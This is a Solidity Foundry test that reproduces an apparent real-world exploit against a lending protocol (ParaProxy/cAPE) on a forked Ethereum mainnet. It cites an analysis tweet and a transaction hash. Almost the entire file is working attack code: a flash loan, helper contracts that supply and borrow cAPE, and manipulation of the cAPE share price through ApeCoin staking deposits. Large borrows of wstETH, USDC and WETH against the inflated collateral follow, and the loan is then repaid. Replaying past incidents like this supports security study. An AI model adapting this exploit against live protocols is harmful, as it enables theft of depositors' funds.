// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1636650252844294144
// @TX
// https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a

contract ContractTest is Test {
    address _pcAPE = 0xDDDe38696FBe5d11497D72d8801F651642d62353;
    address _vDebtUSDC = 0x1B36ad30F6866716FF08EB599597D8CE7607571d;
    address _vDebtwstETH = 0xCA76D6D905b08e3224945bFA0340E92CCbbE5171;
    address _vDebtWETH = 0x87F92191e14d970f919268045A57f7bE84559CEA;
    address _APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    address _USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address _ParaProxy = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;
    address _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address _cAPE = 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF;
    address _Apecoin__Staking = 0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9;
    address _Uniswap_V3__Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address _proxy = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_845_558);
        cheats.label(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, "_wstETH");
        cheats.label(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, "_WETH");
        cheats.label(0xDDDe38696FBe5d11497D72d8801F651642d62353, "_pcAPE");
        cheats.label(0x4d224452801ACEd8B2F0aebE155379bb5D594381, "_APE");
        cheats.label(0x1B36ad30F6866716FF08EB599597D8CE7607571d, "_vDebtUSDC");
        cheats.label(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF, "_cAPE");
        cheats.label(0xCA76D6D905b08e3224945bFA0340E92CCbbE5171, "_vDebtwstETH");
        cheats.label(0x87F92191e14d970f919268045A57f7bE84559CEA, "_vDebtWETH");
        cheats.label(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, "_USDC");
        cheats.label(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee, "_ParaProxy");
        cheats.label(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2, "_proxy");
        cheats.label(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9, "_Apecoin__Staking");
        cheats.label(0xE592427A0AEce92De3Edee1F18E0157C05861564, "_Uniswap_V3__Router");
    }

    function testExploit() external {
        emit log_named_uint("Before exploit, _WETH balance of Attacker:", IERC20(_WETH).balanceOf(address(this)));
        emit log_named_uint("Before exploit, _pcAPE balance of Exploit:", IERC20(_pcAPE).balanceOf(address(this)));
        emit log_named_uint(
            "Before exploit, _vDebtUSDC balance of Exploit:", IERC20(_vDebtUSDC).balanceOf(address(this))
        );
        emit log_named_uint(
            "Before exploit, _vDebtWETH balance of Exploit:", IERC20(_vDebtWETH).balanceOf(address(this))
        );
        emit log_named_uint("Before exploit, _cAPE balance of Exploit:", IERC20(_cAPE).balanceOf(address(this)));
        emit log_named_uint(
            "Before exploit, _vDebtwstETH balance of Exploit:", IERC20(_vDebtwstETH).balanceOf(address(this))
        );

        // () -> ()
        _proxy.call(
            abi.encodePacked(
                bytes4(0x42b0b77c),
                abi.encode(address(this), _wstETH, uint256(47_352_823_905_004_708_422_332), new bytes(0), uint16(0))
            )
        );

        emit log_named_uint("After exploit, _WETH balance of Attacker:", IERC20(_WETH).balanceOf(address(this)));
        emit log_named_uint("After exploit, _pcAPE balance of Exploit:", IERC20(_pcAPE).balanceOf(address(this)));
        emit log_named_uint(
            "After exploit, _vDebtUSDC balance of Exploit:", IERC20(_vDebtUSDC).balanceOf(address(this))
        );
        emit log_named_uint(
            "After exploit, _vDebtWETH balance of Exploit:", IERC20(_vDebtWETH).balanceOf(address(this))
        );
        emit log_named_uint("After exploit, _cAPE balance of Exploit:", IERC20(_cAPE).balanceOf(address(this)));
        emit log_named_uint(
            "After exploit, _vDebtwstETH balance of Exploit:", IERC20(_vDebtwstETH).balanceOf(address(this))
        );
    }

    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) public payable returns (bool) {
        // approve(spender, amount) -> (bool _: true)
        _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));

        for (uint256 i = 0; i < 8; i++) {
            Slave _slave = new Slave();
            if (i == 6) {
                // transfer(recipient, amount) -> (bool _: true)
                _wstETH.call(
                    abi.encodePacked(
                        bytes4(0xa9059cbb), abi.encode(address(_slave), uint256(3_676_225_912_400_376_673_786))
                    )
                );
                _slave.remove(1_120_000_000_000_000_000_000_000);
            } else {
                // transfer(recipient, amount) -> (bool _: true)
                _wstETH.call(
                    abi.encodePacked(
                        bytes4(0xa9059cbb), abi.encode(address(_slave), uint256(6_039_513_998_943_475_964_078))
                    )
                );
                _slave.remove(1_840_000_000_000_000_000_000_000);
            }

            if (i != 7) {
                // supply(asset, amount, onBehalfOf, referralCode) -> ()
                _ParaProxy.call(
                    abi.encodePacked(
                        bytes4(0x617ba037),
                        abi.encode(_cAPE, IERC20(_cAPE).balanceOf(address(this)), address(this), uint256(0))
                    )
                );
            }
        }

        // approve(spender, amount) -> (bool _: true)
        _wstETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));

        // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut) 1334451948153998962969
        ExactInputSingleParams memory _var4 = ExactInputSingleParams({
            tokenIn: _wstETH,
            tokenOut: _WETH,
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: 1_400_000_000_000_000_000_000,
            amountOutMinimum: 1_300_000_000_000_000_000_000,
            sqrtPriceLimitX96: 0
        });
        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var4)));

        // approve(spender, amount) -> (bool _: true)
        _WETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));

        // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut) 492214464588784613678468
        ExactInputSingleParams memory _var6 = ExactInputSingleParams({
            tokenIn: _WETH,
            tokenOut: _APE,
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: IERC20(_WETH).balanceOf(address(this)),
            amountOutMinimum: 480_000_000_000_000_000_000_000,
            sqrtPriceLimitX96: 0
        });
        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var6)));

        // withdraw(amount) -> ()
        _cAPE.call(abi.encodePacked(bytes4(0x2e1a7d4d), abi.encode(IERC20(_cAPE).balanceOf(address(this)))));

        // approve(spender, amount) -> (bool _: true)
        _APE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Apecoin__Staking, type(uint256).max)));

        // depositApeCoin(amount,recipient) -> ()
        _Apecoin__Staking.call(
            abi.encodePacked(bytes4(0xbd5023a9), abi.encode(IERC20(_APE).balanceOf(address(this)), _cAPE))
        );

        // approve(spender, amount) -> (bool _: true)
        _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));

        // borrow(asset, amount, referralCode, onBehalfOf) -> ()
        _ParaProxy.call(
            abi.encodePacked(
                bytes4(0x1d5d7237),
                abi.encode(_wstETH, uint256(44_952_823_905_004_708_422_332), uint256(0), address(this))
            )
        );

        // borrow(asset, amount, referralCode, onBehalfOf) -> ()
        _ParaProxy.call(
            abi.encodePacked(
                bytes4(0x1d5d7237), abi.encode(_USDC, uint256(7_200_000_000_000), uint256(0), address(this))
            )
        );

        // borrow(asset, amount, referralCode, onBehalfOf) -> ()
        _ParaProxy.call(
            abi.encodePacked(
                bytes4(0x1d5d7237), abi.encode(_WETH, uint256(1_200_000_000_000_000_000_000), uint256(0), address(this))
            )
        );

        // approve(spender, amount) -> (bool _: true)
        _USDC.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));

        // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut)
        ExactInputSingleParams memory _var9 = ExactInputSingleParams({
            tokenIn: _USDC,
            tokenOut: _WETH,
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: IERC20(_USDC).balanceOf(address(this)),
            amountOutMinimum: 4_042_105_262,
            sqrtPriceLimitX96: 0
        });
        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var9)));

        // approve(spender, amount) -> (bool _: true) --- TOTAL DEBT TO PAY THE LOAN
        _wstETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_proxy, uint256(47_376_500_316_957_210_776_543))));

        // exactOutputSingle(ExactOutputSingleParams calldata params) -> (uint256 amountOut)
        ExactOutputSingleParams memory _var11 = ExactOutputSingleParams({
            tokenIn: _WETH,
            tokenOut: _wstETH,
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountOut: 47_376_500_316_957_210_776_543 - IERC20(_wstETH).balanceOf(address(this)),
            amountInMaximum: 2_675_071_643_612_383_606_774,
            sqrtPriceLimitX96: 0
        });
        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0xdb3e2198), abi.encode(_var11)));

        // true
        return true;
    }

    receive() external payable {}
}

contract Slave {
    address _wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address _cAPE = 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF;
    address _ParaProxy = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    constructor() {
        // approve(spender, amount) -> (bool _: true)
        (, bytes memory returned0) =
            _wstETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));
        bool _var0 = abi.decode(returned0, (bool));
    }

    function remove(uint256 _amountOfShares) public payable {
        // supply(asset, amount, onBehalfOf, referralCode) -> ()
        _ParaProxy.call(
            abi.encodePacked(
                bytes4(0x617ba037),
                abi.encode(_wstETH, IERC20(_wstETH).balanceOf(address(this)), address(this), uint256(0))
            )
        );

        // borrow(asset, amount, referralCode, onBehalfOf) -> ()
        _ParaProxy.call(
            abi.encodePacked(bytes4(0x1d5d7237), abi.encode(_cAPE, uint256(_amountOfShares), uint256(0), address(this)))
        );

        // transfer(recipient, amount) -> (bool _: true)
        _cAPE.call(abi.encodePacked(bytes4(0xa9059cbb), abi.encode(msg.sender, IERC20(_cAPE).balanceOf(address(this)))));
    }
}
